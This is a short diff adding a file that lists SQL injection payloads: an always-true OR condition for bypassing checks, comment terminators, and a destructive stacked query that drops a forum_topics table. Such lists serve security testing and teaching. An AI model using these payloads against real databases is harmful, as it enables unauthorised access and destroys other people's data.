@@ -1,0 +1,14 @@
+OR payload 
+
+' or '1' = '1
+
+
+comment payload
+
+#
+-- 
+//
+
+delete payload
+ 
+'; DROP TABLE forum_topics; --
